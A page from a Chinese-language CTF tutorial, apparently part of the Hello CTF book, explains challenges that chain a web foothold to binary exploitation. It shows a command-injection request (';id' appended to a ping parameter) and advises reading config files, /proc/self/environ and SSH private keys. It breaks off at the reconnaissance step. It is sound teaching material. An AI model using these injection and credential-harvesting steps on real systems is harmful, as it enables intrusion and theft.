@@ -1,0 +1,1487 @@
+
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh" dir="ltr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+    <title>Web与二进制结合 | Hello CTF</title>
+  
+  <meta name="description" content="开源免费、新手友好的CTF(Capture The Flag,夺旗赛)入门教程">
+  <link rel="icon" href="../../assets/images/favicon.png">
+
+  <!-- 字体（与首页同源） -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Noto+Sans+SC:wght@400;500;700;800&display=swap" rel="stylesheet">
+
+  <!-- material 文章排版 CSS（pin 9.7.7 的 hash 文件名，升级主题时同步更新） -->
+  <link rel="stylesheet" href="../../assets/stylesheets/main.ec1eaa64.min.css">
+  <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+
+  <!-- Hello-CTF 外壳 -->
+  <link rel="stylesheet" href="../../shell/shell.css">
+  <link rel="stylesheet" href="../../shell/shell-docs.css">
+  <link rel="stylesheet" href="../../shell/shell-article.css">
+
+  <!-- 站点原有 extra_css（katex CDN / extra.css / bannerSlider.css 等） -->
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.css">
+  
+    <link rel="stylesheet" href="../../stylesheets/extra.css">
+  
+
+  <!-- admonition 等组件的图标 SVG 变量（原由 material base.html 注入） -->
+  
+
+
+
+  
+  
+  
+
+<script id="__analytics">function __md_analytics(){function e(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],e("js",new Date),e("config","G-V9998CDNR1"),document.addEventListener("DOMContentLoaded",(function(){document.forms.search&&document.forms.search.query.addEventListener("blur",(function(){this.value&&e("event","search",{search_term:this.value})}));document$.subscribe((function(){var t=document.forms.feedback;if(void 0!==t)for(var a of t.querySelectorAll("[type=submit]"))a.addEventListener("click",(function(a){a.preventDefault();var n=document.location.pathname,d=this.getAttribute("data-md-value");e("event","feedback",{page:n,data:d}),t.firstElementChild.disabled=!0;var r=t.querySelector(".md-feedback__note [data-md-value='"+d+"']");r&&(r.hidden=!1)})),t.hidden=!1})),location$.subscribe((function(t){e("config","G-V9998CDNR1",{page_path:t.pathname})}))}));var t=document.createElement("script");t.async=!0,t.src="https://www.googletagmanager.com/gtag/js?id=G-V9998CDNR1",document.getElementById("__analytics").insertAdjacentElement("afterEnd",t)}</script>
+</head>
+<body data-md-color-scheme="default">
+
+  <!-- 主题初始化（先于渲染，避免闪烁）：hc-theme → shell data-theme + material slate -->
+  <script>
+    (function () {
+      var t = null;
+      try { t = localStorage.getItem("hc-theme"); } catch (e) {}
+      if (t) {
+        document.documentElement.dataset.theme = t;
+        document.body.setAttribute("data-md-color-scheme", t === "dark" ? "slate" : "default");
+      }
+    })();
+    window.__md_palette_sync = function (t) {
+      document.body.setAttribute("data-md-color-scheme", t === "dark" ? "slate" : "default");
+    };
+  </script>
+
+  <script src="../../shell/search.js"></script>
+  <script src="../../shell/shell.js"></script>
+  <script>Shell.mount({ active: "" });</script>
+
+  <!-- 主区：顶部文档导航 + 文章 + TOC -->
+  <div class="main">
+    <nav class="hc-topnav" aria-label="文档导航">
+      <div class="hc-topnav-inner">
+        
+          
+          
+            <a class="tn-item tn-single" href="../../hc-start/"><svg class="ic tn-ico"><use href="#i-book"/></svg>快速开始</a>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-book"/></svg>前言<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-preface/">前言</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-preface/about/">关于本书</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-preface/usage/">食用方法</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-preface/join/">加入我们</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-puzzle"/></svg>MISC<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-misc/">MISC | 杂项</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/osint/">信息收集</a>
+    
+  
+    
+      <div class="tn-group">文件与编码基础</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-misc/Encode_extra/">编码扩展</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/file/">文件基础</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/Archivefile/">压缩包</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">隐写分析</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-misc/stego/">图片隐写</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/file_stego/">文件隐写</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/audio_stego/">音频隐写</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">取证分析</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-misc/pcap/">流量分析</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/memory/">内存取证</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/industrial/">工控类</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/file_sign/">附:文件签名表</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item on">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-globe"/></svg>Web<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../">Web | 网络攻防</a>
+    
+  
+    
+      <div class="tn-group">环境与工具</div>
+      
+  
+    
+      <a class="tn-link" href="../web_env/">Web环境设置</a>
+    
+  
+    
+      <a class="tn-link" href="../docker_install/">Docker安装配置</a>
+    
+  
+    
+      <a class="tn-link" href="../docker_env/">Docker与漏洞环境</a>
+    
+  
+    
+      <a class="tn-link" href="../vm_lab/">虚拟机与网络模拟</a>
+    
+  
+    
+      <a class="tn-link" href="../burp/">Burp Suite</a>
+    
+  
+    
+      <a class="tn-link" href="../py_script/">Python脚本</a>
+    
+  
+    
+      <a class="tn-link" href="../http/">HTTP协议</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../web_start/">Web入门题单</a>
+    
+  
+    
+      <div class="tn-group">信息收集</div>
+      
+  
+    
+      <a class="tn-link" href="../sensitive_info/">敏感信息泄露</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">PHP专题</div>
+      
+  
+    
+      <a class="tn-link" href="../php_features/">PHP特性与常见绕过</a>
+    
+  
+    
+      <a class="tn-link" href="../php_basic/">PHP基础</a>
+    
+  
+    
+      <a class="tn-link" href="../php_unser/">PHP反序列化</a>
+    
+  
+    
+      <a class="tn-link" href="../php_code_audit/">PHP代码审计</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">注入类漏洞</div>
+      
+  
+    
+      <a class="tn-link" href="../sql_injection/">SQL注入</a>
+    
+  
+    
+      <a class="tn-link" href="../nosql/">NoSQL注入</a>
+    
+  
+    
+      <a class="tn-link" href="../xss/">XSS攻击</a>
+    
+  
+    
+      <a class="tn-link" href="../csrf/">CSRF攻击</a>
+    
+  
+    
+      <a class="tn-link" href="../ssti/">SSTI注入</a>
+    
+  
+    
+      <a class="tn-link" href="../xxe/">XXE注入</a>
+    
+  
+    
+      <a class="tn-link" href="../ssrf/">SSRF注入</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">文件类漏洞</div>
+      
+  
+    
+      <a class="tn-link" href="../file_upload/">文件上传</a>
+    
+  
+    
+      <a class="tn-link" href="../include/">文件包含</a>
+    
+  
+    
+      <a class="tn-link" href="../dir_traversal/">目录穿越</a>
+    
+  
+    
+      <a class="tn-link" href="../any_file_read/">任意文件读取</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">命令与代码执行</div>
+      
+  
+    
+      <a class="tn-link" href="../rce/">RCE</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../session_jwt/">会话与认证安全</a>
+    
+  
+    
+      <a class="tn-link" href="../logical_vuln/">逻辑漏洞</a>
+    
+  
+    
+      <div class="tn-group">语言扩展 | 世界不止有PHP</div>
+      
+  
+    
+      <a class="tn-link" href="../py_unser/">Python反序列化</a>
+    
+  
+    
+      <a class="tn-link" href="../py_sandbox/">Python沙箱逃逸</a>
+    
+  
+    
+      <a class="tn-link" href="../flask_sec/">Flask安全</a>
+    
+  
+    
+      <a class="tn-link" href="../prototype_pollution/">原型链污染</a>
+    
+  
+    
+      <a class="tn-link" href="../js_sandbox/">JS沙箱逃逸</a>
+    
+  
+    
+      <a class="tn-link" href="../js_reverse/">JS逆向</a>
+    
+  
+    
+      <a class="tn-link" href="../java_basic/">Java安全基础</a>
+    
+  
+    
+      <a class="tn-link" href="../java_unser/">Java反序列化</a>
+    
+  
+    
+      <a class="tn-link" href="../spring/">Spring漏洞</a>
+    
+  
+    
+      <a class="tn-link" href="../java_audit/">Java代码审计</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">进阶专题</div>
+      
+  
+    
+      <a class="tn-link" href="../waf_bypass/">WAF绕过</a>
+    
+  
+    
+      <a class="tn-link" href="../http_smuggling/">请求走私</a>
+    
+  
+    
+      <a class="tn-link" href="../cache_poisoning/">缓存投毒</a>
+    
+  
+    
+      <a class="tn-link" href="../xs_leaks/">XS-Leaks</a>
+    
+  
+    
+      <a class="tn-link" href="../web_crypto/">密码学应用题</a>
+    
+  
+    
+      <a class="tn-link" href="../cloud_container/">云与容器安全</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">实战能力</div>
+      
+  
+    
+      <div class="tn-group">渗透链路基础</div>
+      
+  
+    
+      <a class="tn-link" href="../pentest_flow/">渗透流程总览</a>
+    
+  
+    
+      <a class="tn-link" href="../two_layer/">两层网络实战</a>
+    
+  
+    
+      <a class="tn-link" href="../foothold/">立足点建立</a>
+    
+  
+    
+      <a class="tn-link" href="../internal_recon/">内网信息收集</a>
+    
+  
+    
+      <a class="tn-link" href="../proxy_tunnel/">代理与隧道</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">多层网络渗透</div>
+      
+  
+    
+      <a class="tn-link" href="../three_layer/">三层网络实战</a>
+    
+  
+    
+      <a class="tn-link" href="../multi_layer/">多层网络综合</a>
+    
+  
+    
+      <a class="tn-link" href="../ad_basic/">域渗透入门</a>
+    
+  
+    
+      <a class="tn-link" href="../lateral/">横向移动</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">对抗与综合</div>
+      
+  
+    
+      <a class="tn-link" href="../awd/">AWD模式</a>
+    
+  
+    
+      <a class="tn-link on" href="./">Web与二进制结合</a>
+    
+  
+    
+      <a class="tn-link" href="../nday/">Nday利用</a>
+    
+  
+    
+      <a class="tn-link" href="../review/">Writeup复盘方法</a>
+    
+  
+
+    
+  
+
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-lock"/></svg>Crypto<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-crypto/">Crypto | 密码学</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-crypto/env/">环境配置</a>
+    
+  
+    
+      <div class="tn-group">基础知识</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Recap/">前情提要</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Encode/">编码基础</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">密码体系</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Classicalcipher/">古典密码</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Moderncipher/">现代密码</a>
+    
+  
+
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-cpu"/></svg>Reverse<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-reverse/">逆向工程</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%BC%95%E5%AF%BC%E7%AF%87%EF%BC%9A%E7%81%B5%E9%AD%82FAQ/">引导篇：灵魂FAQ</a>
+    
+  
+    
+      <div class="tn-group">编译与可执行文件</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/">C语言基础</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%AD%98%E5%82%A8%E7%BB%93%E6%9E%84/">存储结构</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Quick%20Start%EF%BC%9A%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/">可执行文件</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">交互式反汇编工具IDA</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/StartWithIDA/">从零开始的IDA</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/IDA%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/">IDA动态调试</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">常见算法</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%9F%BA%E6%9C%AC%E8%BF%90%E7%AE%97/">基本运算</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E7%BC%96%E7%A0%81%E5%9F%BA%E7%A1%80/">编码基础</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%AD%97%E8%8A%82%E6%B5%81%E7%AE%97%E6%B3%95/">字节流算法</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81/">分组密码</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/z3%E7%BA%A6%E6%9D%9F%E6%B1%82%E8%A7%A3/">z3约束求解</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Quick%20Start%EF%BC%9AASM%E6%B1%87%E7%BC%96/">x86 汇编初步</a>
+    
+  
+    
+      <div class="tn-group">代码保护与对抗</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E8%8A%B1%E6%8C%87%E4%BB%A4/">花指令</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84%E5%A3%B3/">加壳</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/VM/">VM</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/SMC/">SMC</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/">异常处理</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%A4%9A%E7%BA%BF%E7%A8%8B/">多线程</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/TLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/">TLS回调函数</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%8F%8D%E8%B0%83%E8%AF%95/">反调试</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/">控制流平坦化</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/">符号执行</a>
+    
+  
+    
+      <div class="tn-group">语言与框架</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Python/">Python</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/NET/">.NET</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Rust/">Rust</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/JavaScript/">JavaScript</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Android/">Android平台</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E8%A7%A3%E9%A2%98%E6%8A%80%E5%B7%A7/">解题技巧</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-terminal"/></svg>Pwn<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-pwn/">Pwn | 二进制安全</a>
+    
+  
+    
+      <div class="tn-group">环境与基础</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-pwn/wsl2_environment/">wsl2下的环境配置</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/Asm_x86/">汇编语言(x86)</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/Protections/">常见保护</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">栈溢出</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-pwn/Stack_Overflow/">栈上数组越界&栈溢出</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">ROP利用</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-pwn/ROP/">ROP入门</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/ROP_Tricks/">常见的ROP技巧</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/rop_add_v1/">ROP进阶</a>
+    
+  
+
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-shield"/></svg>AWD<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_about/">AWD介绍</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_platform/">AWD平台</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_web.exp/">【WEB】AWD技巧</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_pwn.exp/">【PWN】AWD技巧</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-bot"/></svg>AI<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-ai/">AI | 人工智能</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-ai/What_is_AI/">初识AI</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-ai/MLP/">你的第一个神经网络</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-link"/></svg>区块链<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <div class="tn-group">Move</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x00/">从0开始的签到题</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x01/">独特的所有权</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x02/">神奇的时钟</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x03/">对象与燃气</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x04/">多样的泛型</a>
+    
+  
+
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-tag"/></svg>附录<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-appendix/how-to-ask/">提问的智慧</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-appendix/NSSCTF_Usage/">NSSCTF平台使用</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-appendix/book/">推荐书单</a>
+    
+  
+</div>
+            </div>
+          
+        
+      </div>
+    </nav>
+    <div class="doc-layout">
+      <article class="md-typeset hc-article">
+        <!-- Tags -->
+
+
+<!-- Actions -->
+<!-- Actions -->
+
+
+  <!-- Edit button -->
+  
+
+  <!-- View button -->
+  
+
+
+<!-- Page content -->
+<div><h1 id="web">Web与二进制结合<a class="headerlink" href="#web" title="Permanent link">¶</a></h1>
+<p>在 CTF 比赛中，有一类题目会把 Web 安全和二进制（Pwn）结合起来考察：你在 Web 页面里找到的漏洞只是入场券，真正的 flag 藏在后端的二进制程序里。这类题考察的是「打通链路」的能力——先通过 Web 漏洞拿到立足点，再利用收集到的信息攻击二进制组件。本章讲解这类题的常见形态、信息衔接思路和一套完整的组合拳。</p>
+<h2 id="_1">这类题的常见形态<a class="headerlink" href="#_1" title="Permanent link">¶</a></h2>
+<p>Web 与二进制结合的题目，通常具有一个共同点：<strong>Web 应用只是一个入口，核心逻辑或 flag 由一个二进制组件承载</strong>。常见的形态有以下几种。</p>
+<h3 id="web_1">形态一：Web 入口 → 内部服务是二进制组件<a class="headerlink" href="#web_1" title="Permanent link">¶</a></h3>
+<p>最典型的架构是：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>[选手] --HTTP--&gt; [Web 服务 (Nginx/PHP/Flask)] --本地协议--&gt; [二进制服务 (ELF)]
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>                                                              │
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>                                                          flag 在这里
+</code></pre></div>
+<p>Web 服务负责接收请求、做简单的参数处理，然后把数据转发给同一台机器（或同一容器）上监听的二进制服务。二进制服务可能是：</p>
+<ul>
+<li>一个监听在 <code>127.0.0.1:xxxx</code> 的 TCP 服务（比如 C 写的网络程序）；</li>
+<li>一个由 Web 通过 <code>popen</code> / <code>system</code> / 进程间通信调用的命令行工具；</li>
+<li>一个通过 FastCGI、Unix Socket 暴露的后端程序。</li>
+</ul>
+<p>攻击思路：先在 Web 层找到 RCE、命令注入或任意文件读取（见本书「RCE」「任意文件读取」章节），拿到立足点后再去分析并攻击二进制服务。</p>
+<h3 id="_2">形态二：需要服务漏洞利用<a class="headerlink" href="#_2" title="Permanent link">¶</a></h3>
+<p>立足点拿到后，直接读不到 flag——flag 文件权限是 <code>400</code> 且属于 root，或者 flag 只在二进制服务的内存里。这时就需要对二进制服务做经典的 Pwn 攻击：栈溢出、格式化字符串、堆利用等。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c1"># 立足点后常见的情形：flag 读不了</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>www-data@target:~$<span class="w"> </span>cat<span class="w"> </span>/flag
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>cat:<span class="w"> </span>/flag:<span class="w"> </span>Permission<span class="w"> </span>denied
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>www-data@target:~$<span class="w"> </span>ls<span class="w"> </span>-l<span class="w"> </span>/flag
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>-r--------<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">36</span><span class="w"> </span>Jun<span class="w">  </span><span class="m">1</span><span class="w"> </span><span class="m">10</span>:00<span class="w"> </span>/flag
+</code></pre></div>
+<h3 id="_3">形态三：需要提权打通链路<a class="headerlink" href="#_3" title="Permanent link">¶</a></h3>
+<p>有些题目里二进制服务本身没有漏洞，或者漏洞利用后拿到的仍是低权限 shell，最后一步是 Linux 提权（SUID 滥用、内核漏洞、sudo 配置错误等）。这类题本质上是「Web 立足点 + 本地提权」，二进制部分可能只是最后执行 <code>getflag</code> 之类的 SUID 程序。</p>
+<p><strong>做题时的判断流程</strong>：拿到 Web 立足点后，先问自己三个问题：</p>
+<ol>
+<li>flag 现在能直接读到吗？能就结束，不能就下一步；</li>
+<li>目标机器上有没有二进制服务在监听（<code>ss -tlnp</code>）或可疑的 ELF 文件？</li>
+<li>有没有 SUID 程序、sudo 权限、高版本内核等提权线索？</li>
+</ol>
+<h2 id="web_2">信息衔接：Web 层的信息如何指导二进制利用<a class="headerlink" href="#web_2" title="Permanent link">¶</a></h2>
+<p>Web 层拿到立足点之前和之后，你收集到的每一条信息都可能是二进制利用的关键拼图。衔接的核心思路是：<strong>Web 层负责「侦察」，二进制层负责「攻坚」</strong>。</p>
+<h3 id="_4">版本信息<a class="headerlink" href="#_4" title="Permanent link">¶</a></h3>
+<ul>
+<li>Web 层的报错页面、<code>Server</code> 响应头、<code>phpinfo()</code> 泄露的路径，可能暴露操作系统发行版（如 <code>Ubuntu 20.04</code>），这直接决定了 libc 版本和内核版本。</li>
+<li>如果能下载到目标二进制文件（通过任意文件读取或源码泄露），在本地用 <code>checksec</code> 分析保护机制：</li>
+</ul>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>$<span class="w"> </span>checksec<span class="w"> </span>--file<span class="o">=</span>./pwn_server
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span><span class="s1">'/home/ctf/pwn_server'</span>
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="w">    </span>Arch:<span class="w">     </span>amd64-64-little
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="w">    </span>RELRO:<span class="w">    </span>Partial<span class="w"> </span>RELRO
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="w">    </span>Stack:<span class="w">    </span>Canary<span class="w"> </span>found
+<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="w">    </span>NX:<span class="w">       </span>NX<span class="w"> </span>enabled
+<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="w">    </span>PIE:<span class="w">      </span>No<span class="w"> </span>PIE<span class="w"> </span><span class="o">(</span>0x400000<span class="o">)</span>
+</code></pre></div>
+<p>No PIE 意味着地址固定，ret2text/ret2libc 的地址不需要泄漏；有 Canary 则需要先想办法泄漏 Canary 值。</p>
+<h3 id="_5">配置信息<a class="headerlink" href="#_5" title="Permanent link">¶</a></h3>
+<ul>
+<li>Web 应用的配置文件（如 <code>config.php</code>、<code>.env</code>）里常有内部服务的监听地址、端口和通信协议格式——这正是你构造二进制交互的说明书。</li>
+<li>通过 Web 的文件读取漏洞读 <code>/proc/net/tcp</code>、<code>/etc/supervisord.conf</code>、<code>docker-compose.yml</code> 等，可以摸清内部服务拓扑。</li>
+</ul>
+<h3 id="_6">凭据与密钥<a class="headerlink" href="#_6" title="Permanent link">¶</a></h3>
+<ul>
+<li>配置文件里的数据库密码、API Token，可能同时也是二进制服务的鉴权口令，或者 su 提权用的密码。</li>
+<li>读到的 SSH 私钥（<code>/home/*/.ssh/id_rsa</code>）可能让你直接从低权限 Web shell 换成功能完整的用户 shell，方便做本地调试。</li>
+</ul>
+<h3 id="_7">一条原则<a class="headerlink" href="#_7" title="Permanent link">¶</a></h3>
+<p>不要急着对着二进制硬刚。先在 Web 层把能读的文件都读了：源码、配置、<code>/proc</code>、环境变量（<code>/proc/self/environ</code>）。很多 Web+Pwn 题的难度其实不在 Pwn 本身，而在于你能否从 Web 层拿到「二进制程序的源码或协议格式」这块拼图。</p>
+<h2 id="web-flag">常见组合拳示例：从 Web 立足点到拿下 flag<a class="headerlink" href="#web-flag" title="Permanent link">¶</a></h2>
+<p>下面给出一套最典型的完整链路推演：<strong>Web RCE → 容器内立足点 → 攻击本地 SUID 程序 / 内部服务端口</strong>。</p>
+<h3 id="_8">场景设定<a class="headerlink" href="#_8" title="Permanent link">¶</a></h3>
+<ul>
+<li>目标是一个 PHP 站点，存在命令注入漏洞；</li>
+<li>容器内有一个 SUID 的 ELF 程序 <code>/usr/local/bin/readflag</code>，只有它能读 <code>/flag</code>；</li>
+<li><code>readflag</code> 存在栈溢出漏洞。</li>
+</ul>
+<h3 id="web_3">第一步：Web 层拿到命令执行<a class="headerlink" href="#web_3" title="Permanent link">¶</a></h3>
+<p>假设站点有个 ping 功能，参数直接拼接进 <code>system()</code>（这类漏洞的详细原理见本书「RCE」章节）：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>curl<span class="w"> </span><span class="s1">'http://target/ping.php?ip=127.0.0.1;id'</span>
+</code></pre></div>
+<p>返回中出现 <code>uid=33(www-data) gid=33(www-data)</code>，确认拿到 <code>www-data</code> 权限的命令执行。</p>
+<h3 id="_9">第二步：侦察容器内部<a class="headerlink" href="#_9" title="Permanent link">¶</a></h3>
+<p>通过命令注入逐个执行侦察命令：</p>
